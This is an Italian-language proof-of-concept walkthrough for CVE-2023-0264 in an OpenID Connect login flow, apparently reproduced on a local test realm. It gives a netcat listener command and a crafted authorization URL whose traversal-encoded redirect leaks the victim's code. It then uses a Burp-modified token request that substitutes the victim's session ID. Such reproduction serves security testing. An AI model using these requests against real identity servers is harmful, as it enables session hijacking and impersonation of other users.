# CVE-2023-0264 User impersonation via stolen UUID code

- creazione di due utenti, `paola` e `mario` per esempio
- attivazione un listner `$ nc -lvnp 1234`
- autenticazione dell'utente `paola`, l'utente vittima, utilizzando il link descritto nella CVE precedente e qui di seguito riportato:

```shell
https://localhost:4200/realms/winted/protocol/openid-connect/auth?
client_id=winted-web&
redirect_uri=
https%3A%2F%2Flocalhost%3A4200%2Flogin%2f%252E%252E%2fvuln?
url=http%3A%2F%2Flocalhost%3A1234&
state=0a1aeed9-19ae-4f77-b59b-5e7bfe9c5bf6&
response_mode=fragment&
response_type=code&
scope=openid&
nonce=bbe689db-3669-44d0-8934-e224075e93a9
```
b9e16b48-a00a-4e7d-9f96-a1292a90e6f8
- cattura e conservazione del `session_state` perché servirà nei passaggi successivi. Questo parametro rappresenta il `session_id` dell'utente vittima, in questo caso l'utente `paola`. Si noti che la parte centrale del parametro `code` coincide con il `session_state` stesso. 

```shell
GET /?state=0a1aeed9-19ae-4f77-b59b-5e7bfe9c5bf6&
session_state=231fd8bc-2259-417b-9887-a4dcfb9c8f46&
code=d310bb8c-883c-477c-bff3-5e33922a9169.
231fd8bc-2259-417b-9887-a4dcfb9c8f46.
f4e96ce3-fdb3-412d-8ab3-264dd456e096
```
- si è effettuato il logout dell'utente `paola`
- si è verificato che non vi erano più nessun cookie salvato
- si è attivato Burp e si è attivato il proxy
- si è effettuato il login come `mario`, l'utente malevolo
- si è provveduto a forwardare tramite Burp tutte le richieste fino ad arrivare alla richiesta qui di seguito riportata:

```shell
POST /realms/winted/protocol/openid-connect/token HTTP/1.1
```

- in fine si è proceduto a modificare l'url inserendo il `session_state` della vittima catturato prima:

```shell
POST /realms/winted/protocol/openid-connect/token HTTP/1.1
...cut...
code=96a0d20a-0ca8-461f-bc3c-e8e50ef60d62.<SESSION_ID_VITTIMA>.f4e96ce3-fdb3-412d-8ab3-264dd456e096
```

- Il processo termina inviando la richiesta
